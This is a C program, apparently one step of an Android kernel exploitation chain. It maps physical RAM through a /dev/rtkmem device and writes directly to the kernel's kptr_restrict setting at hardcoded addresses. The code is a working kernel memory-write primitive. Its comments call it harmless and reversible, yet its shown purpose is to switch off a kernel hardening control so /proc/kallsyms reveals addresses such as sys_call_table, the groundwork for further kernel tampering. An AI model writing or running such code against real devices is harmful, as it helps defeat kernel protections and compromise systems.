/* rtwrite.c - MINIMAL, REVERSIBLE kernel-memory write test.
 *
 * Step 2.5: prove that a PROT_READ|PROT_WRITE mmap on /dev/rtkmem actually
 * writes through to live physical RAM, using the harmless sysctl variable
 * kptr_restrict as the probe target.
 *
 *   kptr_restrict virt 0xc0c8f6cc -> phys 0x00c8f6cc (PAGE_OFFSET 0xC0000000)
 *   mmap must be page-aligned, so map phys 0x00c8f000 and use +0x6cc.
 *
 * Target value 2 (current) -> 0 -> back to 2. Changing kptr_restrict only
 * affects whether /proc/kallsyms prints addresses; it does NOT grant any
 * privilege and resets on reboot. Verify externally with:
 *   adb shell cat /proc/sys/kernel/kptr_restrict
 *   adb shell "grep ' sys_call_table' /proc/kallsyms"
 *
 * Usage: rtwrite <0|2>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

#define PAGE_BASE_PHYS 0x00c8f000UL
#define INPAGE_OFF     0x6ccUL
#define KPTR_VIRT      0xc0c8f6ccUL

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }

int main(int argc, char **argv) {
    if (argc < 2) { printf("usage: %s <0|2>\n", argv[0]); return 2; }
    uint32_t want = (uint32_t)strtoul(argv[1], NULL, 0);
    if (want != 0 && want != 2) { printf("only 0 or 2 allowed\n"); return 2; }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    int fd = open("/dev/rtkmem", O_RDWR);
    if (fd < 0) { printf("open: %s\n", strerror(errno)); return 2; }
    void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                   fd, (off_t)PAGE_BASE_PHYS);
    if (m == MAP_FAILED) {
        printf("mmap: %s\n", strerror(errno)); return 2;
    }

    volatile uint32_t *slot = (volatile uint32_t *)((char *)m + INPAGE_OFF);
    uint32_t before;
    if (sigsetjmp(g_jmp, 1)) { printf("read faulted\n"); return 3; }
    before = *slot;
    printf("[*] kptr_restrict @virt 0x%08lx : before = %u\n",
           (unsigned long)KPTR_VIRT, before);
    fflush(stdout);

    if (before != 0 && before != 2) {
        printf("[!] unexpected value %u - refusing to write (wrong slot?)\n", before);
        munmap(m, 0x1000); close(fd); return 4;
    }

    if (sigsetjmp(g_jmp, 1)) { printf("write faulted\n"); return 3; }
    *slot = want;
    /* Force the store to be visible to the kernel before we read sysctl. */
    __sync_synchronize();
    msync(m, 0x1000, MS_SYNC);

    uint32_t after = *slot;
    printf("[*] wrote %u, mmap readback = %u\n", want, after);
    munmap(m, 0x1000);
    close(fd);
    printf("[*] now check: adb shell cat /proc/sys/kernel/kptr_restrict\n");
    return 0;
}
